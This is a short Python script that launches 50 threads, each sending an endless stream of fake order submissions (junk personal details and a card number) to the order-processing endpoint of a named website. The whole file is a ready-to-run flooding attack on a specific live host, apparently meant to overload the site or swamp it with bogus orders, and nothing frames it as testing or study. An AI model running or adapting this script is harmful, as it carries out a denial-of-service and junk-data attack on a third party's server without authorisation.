import requests
import threading

url="http://luckypro12.com/PS5/includes/submit_order_limelight.php"

data = {
    'limelight_charset':'utf-8',
    'action': 'submitorder',
    'campaign_id': '6',
    'custom_product': '9',
    'product_qty': '1',
    'sub3': '',
    'prepaid_campaign_id': '4',
    'prepaid_custom_product': '9',
    'shipping': '0',
    'billingSameAsShipping': 'YES',
    'country': 'US',
    'billing_country': 'US',
    'orderId': 'A58C9C46EE',
    'AFFID': '',
    'C1': '',
    'C2': '',
    'C3': '',
    'TRANSID': '',
    'sub3': '',
    'userID': '136687',
    '1': 'on',
    'fields_fname': 'kib',
    'fields_lname': 'kib',
    'fields_email': 'kifasdsa@dsad.com',
    'fields_phone': '1231231231',
    'fields_address1': '123',
    'fields_city': '123',
    'fields_state': 'AL',
    'fields_zip': '123434', 
    'cc_number': '40070000027',
    'cc_expmonth':'08',
    'cc_expyear':'23',
    'cc_ccv':'234',
}


def do_request():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon=True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
